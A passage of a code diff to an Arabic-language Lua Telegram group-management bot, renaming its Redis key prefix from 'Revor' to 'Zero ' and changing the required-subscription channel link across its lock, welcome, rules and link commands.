+Redis:set(Zero .."Zero :Lock:Markdaun"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الماركداون").lockKtm,"md",true)  
 return false
 end 
@@ -6737,10 +6740,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Markdaun"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Markdaun"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الماركداون").lockKick,"md",true)  
 return false
 end 
@@ -6749,10 +6752,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Markdaun"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Markdaun"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الماركداون").unLock,"md",true)  
 return false
 end 
@@ -6761,10 +6764,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Contact"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Contact"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الجهات").Lock,"md",true)  
 return false
 end 
@@ -6773,10 +6776,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Contact"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Contact"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الجهات").lockKid,"md",true)  
 return false
 end 
@@ -6785,10 +6788,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Contact"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Contact"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الجهات").lockKtm,"md",true)  
 return false
 end 
@@ -6797,10 +6800,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Contact"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Contact"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الجهات").lockKick,"md",true)  
 return false
 end 
@@ -6809,10 +6812,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Contact"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Contact"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الجهات").unLock,"md",true)  
 return false
 end 
@@ -6821,10 +6824,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Spam"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Spam"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الكلايش").Lock,"md",true)  
 return false
 end 
@@ -6833,10 +6836,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Spam"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Spam"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الكلايش").lockKid,"md",true)  
 return false
 end 
@@ -6845,10 +6848,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Spam"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Spam"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الكلايش").lockKtm,"md",true)  
 return false
 end 
@@ -6857,10 +6860,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Spam"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Spam"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الكلايش").lockKick,"md",true)  
 return false
 end 
@@ -6869,10 +6872,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Spam"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Spam"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الكلايش").unLock,"md",true)  
 return false
 end 
@@ -6881,10 +6884,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Inlen"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Inlen"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الانلاين").Lock,"md",true)  
 return false
 end 
@@ -6893,10 +6896,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Inlen"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Inlen"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الانلاين").lockKid,"md",true)  
 return false
 end 
@@ -6905,10 +6908,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Inlen"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Inlen"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الانلاين").lockKtm,"md",true)  
 return false
 end 
@@ -6917,10 +6920,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Inlen"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Inlen"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الانلاين").lockKick,"md",true)  
 return false
 end 
@@ -6929,10 +6932,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Inlen"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Inlen"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الانلاين").unLock,"md",true)  
 return false
 end 
@@ -6941,10 +6944,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Set:Link"..msg_chat_id..""..msg.sender.user_id,120,true) 
+Redis:setex(Zero .."Zero :Set:Link"..msg_chat_id..""..msg.sender.user_id,120,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"📥︙ارسل رابط المجموعه او رابط قناة المجموعه","md",true)  
 end
 if text == "مسح الرابط" or text == "حذف الرابط" then
@@ -6952,18 +6955,18 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Group:Link"..msg_chat_id) 
+Redis:del(Zero .."Zero :Group:Link"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم مسح الرابط ","md",true)             
 end
 if text == "الرابط" then
-if not Redis:get(Revor.."Revor:Status:Link"..msg_chat_id) then
+if not Redis:get(Zero .."Zero :Status:Link"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل جلب الرابط من قبل الادمنيه","md",true)
 end 
 local Get_Chat = LuaTele.getChat(msg_chat_id)
-local GetLink = Redis:get(Revor.."Revor:Group:Link"..msg_chat_id) 
+local GetLink = Redis:get(Zero .."Zero :Group:Link"..msg_chat_id) 
 if GetLink then
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
 {{text =Get_Chat.title, url = GetLink}, },}}
@@ -6984,10 +6987,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id, 120, true)  
+Redis:setex(Zero .."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id, 120, true)  
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل لي الترحيب الان".."\n⌔︙تستطيع اضافة مايلي !\n⌔︙دالة عرض الاسم »{`name`}\n⌔︙دالة عرض المعرف »{`user`}\n⌔︙دالة عرض اسم المجموعه »{`NameCh`}","md",true)   
 end
 if text == "الترحيب" then 
@@ -6995,13 +6998,13 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:get(Revor.."Revor:Status:Welcome"..msg_chat_id) then
+if not Redis:get(Zero .."Zero :Status:Welcome"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الترحيب من قبل الادمنيه","md",true)
 end 
-local Welcome = Redis:get(Revor.."Revor:Welcome:Group"..msg_chat_id)
+local Welcome = Redis:get(Zero .."Zero :Welcome:Group"..msg_chat_id)
 if Welcome then 
 return LuaTele.sendText(msg_chat_id,msg_id,Welcome,"md",true)   
 else 
@@ -7013,10 +7016,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Welcome:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :Welcome:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم ازالة ترحيب المجموعه","md",true)   
 end
 if text == "ضع قوانين" or text == "وضع قوانين" then 
@@ -7024,10 +7027,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل لي القوانين الان","md",true)  
 end
 if text == "مسح القوانين" or text == "حذف القوانين" then  
@@ -7035,14 +7038,14 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Group:Rules"..msg_chat_id) 
+Redis:del(Zero .."Zero :Group:Rules"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم ازالة قوانين المجموعه","md",true)    
 end
 if text == "القوانين" then 
-local Rules = Redis:get(Revor.."Revor:Group:Rules" .. msg_chat_id)   
+local Rules = Redis:get(Zero .."Zero :Group:Rules" .. msg_chat_id)   
 if Rules then     
 return LuaTele.sendText(msg_chat_id,msg_id,Rules,"md",true)     
 else      
@@ -7054,7 +7057,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7063,7 +7066,7 @@ end
 if GetInfoBot(msg).Info == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
 end
-Redis:setex(Revor.."Revor:Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل لي وصف المجموعه الان","md",true)  
 end
 if text == "مسح الوصف" or text == "حذف الوصف" then  
@@ -7071,7 +7074,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7090,7 +7093,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7108,13 +7111,13 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if GetInfoBot(msg).Info == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
 end
-Redis:set(Revor.."Revor:Chat:Photo"..msg_chat_id..":"..msg.sender.user_id,true) 
+Redis:set(Zero .."Zero :Chat:Photo"..msg_chat_id..":"..msg.sender.user_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الصوره لوضعها","md",true)    
 end
 
@@ -7123,10 +7126,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:List:Filter"..msg_chat_id)  
+local list = Redis:smembers(Zero .."Zero :List:Filter"..msg_chat_id)  
 if #list == 0 then  
